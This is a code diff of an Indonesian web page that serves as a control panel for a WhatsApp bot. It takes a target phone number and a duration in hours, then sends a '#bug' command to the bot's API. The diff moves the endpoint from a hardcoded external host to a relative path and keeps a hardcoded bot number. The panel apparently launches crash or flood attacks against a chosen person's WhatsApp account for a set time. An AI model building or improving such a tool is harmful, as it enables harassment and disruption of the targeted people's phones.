@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -44,7 +45,7 @@
     <p>Kirim perintah <code>#bug</code> ke Bot WhatsApp</p>
     <label>Nomor Target (cth: 628xxxx)</label>
     <input id="target" placeholder="Masukkan nomor target">
-    
+
     <label>Durasi (jam)</label>
     <input id="durasi" placeholder="Contoh: 0.1">
 
@@ -53,8 +54,7 @@
   </div>
 
   <script>
-    const botNumber = "62895382965656";
-    const apiUrl = "http://faiznideck.inipanel.my.id:3306/send";
+    const apiUrl = "/api/send";
 
     async function kirim() {
       const target = document.getElementById("target").value.trim();
@@ -67,15 +67,12 @@
       }
 
       const pesan = `#bug ${target} ${durasi}`;
-      const url = `${apiUrl}?to=${botNumber}&message=${encodeURIComponent(pesan)}`;
-      
+      const params = new URLSearchParams({ to: "62895382965656", message: pesan });
+
       try {
-        const res = await fetch(url);
-        if (res.ok) {
-          status.innerText = "✅ Perintah dikirim ke bot.";
-        } else {
-          status.innerText = `❌ Gagal: ${res.status}`;
-        }
+        const res = await fetch(apiUrl + "?" + params.toString());
+        const text = await res.text();
+        status.innerText = "✅ Respons: " + text;
       } catch (e) {
         status.innerText = "⚠️ Error koneksi: " + e;
       }
